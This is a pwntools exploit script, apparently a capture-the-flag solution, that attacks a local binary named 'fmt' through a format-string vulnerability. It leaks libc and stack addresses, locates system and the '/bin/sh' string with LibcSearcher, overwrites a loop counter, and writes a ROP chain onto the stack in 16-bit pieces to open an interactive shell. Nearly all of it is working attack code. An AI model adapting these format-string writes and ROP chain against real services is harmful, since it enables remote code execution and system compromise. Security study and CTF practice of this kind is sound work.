from pwn import *
from LibcSearcher import *

#p = remote("cityf01.cs.cityu.edu.hk", 30012)
p = process("./fmt")

def write_hn(addr, target):
	if target == 0:
		tmp = "%12$hn"
	else:
		tmp = "%"+str(target)+"c%12$hn"
	payload = flat([tmp, "a"*(24-len(tmp)-8), p64(addr)])
	p.send(payload)
	
	
def fmt_seg_write(addr, target):
	s4 = u16(p64(target)[:2])
	s3 = u16(p64(target)[2:4])
	s2 = u16(p64(target)[4:6])
	s1 = u16(p64(target)[6:8])
	
	write_hn(addr+6, s1)
	p.recvuntil("Username:\n")
	write_hn(addr+4, s2)
	p.recvuntil("Username:\n")
	write_hn(addr+2, s3)
	p.recvuntil("Username:\n")
	write_hn(addr, s4)

def fmt_write(addr, target, size):
	if size == 8:
		payload = "%"+str(target)+"c%12$ln"
	elif size == 4:
		payload = "%"+str(target)+"c%12$n"
	payload += "a"*(24-len(payload)-8)
	payload = flat([payload, p64(addr)])
	p.send(payload)
	p.recvuntil("Username:\n")

gdb.attach(p, "break *$rebase(0x120B)")

p.recvuntil("Username:\n")
p.send("%19$p"+"#"*18)
content = p.recvuntil("Username:\n", drop=True).split(b"\n")
content = content[1].split(b"#")[0]
libc_start_main_ret = int(content, 16)

libc = LibcSearcher("__libc_start_main_ret", libc_start_main_ret)
libc.select_libc(1)
libc_base = libc_start_main_ret - libc.dump("__libc_start_main_ret")
system_addr = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

print("base:", hex(system_addr))
print("system:", hex(system_addr))

p.send("%14$p"+"#"*18)
content = p.recvuntil("Username:\n", drop=True).split(b"\n")
content = content[1].split(b"#")[0]
main_rbp_addr = int(content, 16)
cnt_addr = main_rbp_addr - 4
print("counter addr:", hex(cnt_addr))
print("main_frame rbp addr:", hex(main_rbp_addr))

p.send("%15$p"+"#"*18)
content = p.recvuntil("Username:\n", drop=True).split(b"\n")
content = content[1].split(b"#")[0]
gadget_addr  = int(content, 16) + 127
print("gadget addr:", hex(gadget_addr))


# set counter to 0
fmt_write(cnt_addr, 0, 4)

# ROP
fmt_seg_write(main_rbp_addr + 8, gadget_addr)
p.recvuntil("Username:\n")
fmt_write(cnt_addr, 0, 4)

fmt_seg_write(main_rbp_addr + 16, bin_sh)
p.recvuntil("Username:\n")

#gdb.attach(p, "break *$rebase(0x120B)")

fmt_seg_write(main_rbp_addr + 24, system_addr)

p.interactive()


